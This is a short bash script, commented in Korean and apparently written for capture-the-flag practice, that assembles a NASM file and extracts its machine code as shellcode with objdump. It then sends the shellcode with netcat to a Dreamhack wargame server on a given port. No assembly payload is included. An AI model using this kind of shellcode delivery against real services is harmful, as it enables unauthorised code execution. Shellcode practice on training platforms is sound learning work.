#!/bin/bash

# 이 스크립트는 주어진 어셈블리어 파일을 컴파일하고 링크하여 바이너리를 생성한 다음,
# 해당 바이너리에서 바이트 코드를 추출하여 shellcode 변수에 저장합니다.
# 마지막으로, netcat을 사용하여 shellcode를 지정된 포트로 전송합니다.
# 이 스크립트를 실행하기 위해 다음과 같은 인자가 필요합니다.
#   1. 어셈블리어 파일 이름
#   2. 포트
# 실행 예제
#   ./shell-code.sh running-cat.asm 20258

ASM_FILE=$1
PORT=$2

# 1단계: 어셈블리어 파일 컴파일
nasm -f elf64 $ASM_FILE -o temp.o

# 2단계: 오브젝트 파일 링크
ld temp.o -o temp

# 3단계: 바이너리에서 바이트 코드 추출
# 주의사항: 출력되는 모든 hex 값이 code로 변환됩니다. 자세한 내용은 실행 결과를 참고하세요.
SHELLCODE=$(objdump -d temp | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | tr -d '\n' | sed 's/../\\x&/g')

# DEBUG
objdump -d temp
echo "SHELLCODE: $SHELLCODE"

# netcat을 사용하여 shellcode를 지정된 포트로 전송
echo -ne "$SHELLCODE" | nc host3.dreamhack.games $PORT

# 임시 파일 정리
rm temp.o temp
